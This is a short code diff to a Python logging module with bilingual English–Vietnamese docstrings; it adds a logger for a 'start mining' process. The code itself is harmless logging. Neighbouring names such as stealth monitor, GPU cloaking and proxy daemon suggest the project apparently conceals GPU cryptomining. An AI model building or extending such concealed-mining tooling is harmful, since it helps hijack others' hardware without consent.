@@ -179,6 +179,15 @@ def get_stealth_monitor_logger():
     """
     return setup_logging('stealth_monitor', str(Path(LOGS_DIR) / 'stealth_monitor.log'), 'DEBUG')
 
+def get_start_mining_logger():
+    """
+    **Get start mining logger** (Lấy logger khởi động khai thác) - Logger cho **main startup process** (tiến trình khởi động chính).
+    
+    Returns:
+        Logger: Start mining logger instance
+    """
+    return setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'DEBUG')
+
 def get_dashboard_logger():
     """
     **Get dashboard logger** (Lấy logger bảng điều khiển) - Logger cho **GPU monitoring dashboard operations** (hoạt động bảng điều khiển giám sát GPU).
@@ -535,6 +544,7 @@ __all__ = [
     'get_resource_manager_logger', 'get_resource_control_logger', 'get_thermal_logger',
     'get_timing_logger', 'get_environment_logger', 'get_nvml_logger', 'get_proxy_daemon_logger',
     'get_stealth_monitor_logger', 'get_dashboard_logger',
+    'get_start_mining_logger',
     
     # Operation functions (preserved)
     'log_gpu_plugin_operation', 'log_gpu_cloaking_operation', 'log_gpu_optimization_operation',
